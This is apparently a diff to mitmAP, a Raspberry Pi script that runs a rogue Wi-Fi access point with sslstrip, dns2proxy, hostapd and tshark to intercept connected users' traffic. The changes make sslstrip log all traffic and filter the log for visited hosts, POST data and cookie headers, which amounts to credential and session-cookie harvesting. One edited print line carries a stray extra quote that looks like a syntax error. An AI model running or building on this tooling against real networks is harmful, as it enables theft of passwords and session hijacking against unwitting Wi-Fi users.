@@ -6,7 +6,7 @@ print("           _ _              ___  ______ \n" +
       " _ __ ___  _| |_ _ __ ___ / /_\ \| |_/ /\n" +
       "| '_ ` _ \| | __| '_ ` _ \|  _  ||  __/ \n" +
       "| | | | | | | |_| | | | | | | | || |    \n" +
-      "|_| |_| |_|_|\__|_| |_| |_\_| |_/\_| 2.0\n" +
+      "|_| |_| |_|_|\__|_| |_| |_\_| |_/\_| 2.1\n" +
       "      RaspberryPI version   by @xdavidhu\n")
 
 script_path = os.path.dirname(os.path.realpath(__file__))
@@ -184,7 +184,7 @@ if sslstrip_if == "y" or sslstrip_if == "":
 
 
     print("[I] Starting AP on " + ap_iface + " in screen terminal...")
-    os.system("sudo screen -S mitmap-sslstrip -m -d python " + script_path + "src/sslstrip2/sslstrip.py -l 9000 -w " + script_path + "logs/mitmap-sslstrip.log")
+    os.system("sudo screen -S mitmap-sslstrip -m -d python " + script_path + "src/sslstrip2/sslstrip.py -l 9000 -w " + script_path + "logs/mitmap-sslstrip.log -a")
     os.system("sudo screen -S mitmap-dns2proxy -m -d sh -c 'cd " + script_path + "src/dns2proxy && python dns2proxy.py'")
     time.sleep(5)
     os.system("sudo screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf")
@@ -197,12 +197,12 @@ if sslstrip_if == "y" or sslstrip_if == "":
     if tshark_if == "y" or tshark_if == "":
         print("[I] Starting TSHARK...")
         os.system("sudo screen -S mitmap-tshark -m -d tshark -i " + ap_iface + " -w " + script_path + "logs/mitmap-tshark.pcap")
-    print("\nTAIL started on " + script_path + "logs/mitmap-sslstrip.log... Wait for output... (press 'CTRL + C' to stop)\nOnly POST requests will be shown.\n")
+    print("\nTAIL started on " + script_path + "logs/mitmap-sslstrip.log... Wait for output... (press 'CTRL + C' to stop)\n HOST-s, POST requests and COOKIES will be shown.\n"")
     try:
         time.sleep(5)
     except:
         print("")
-    os.system("sudo tail -f " + script_path + "logs/mitmap-sslstrip.log")
+    os.system("sudo tail -f " + script_path + "logs/mitmap-sslstrip.log | grep -e 'Sending Request: POST' -e 'New host:' -e 'Sending header: cookie' -e 'POST Data'")
     #STARTING POINT
 #SSLSTRIP MODE
 
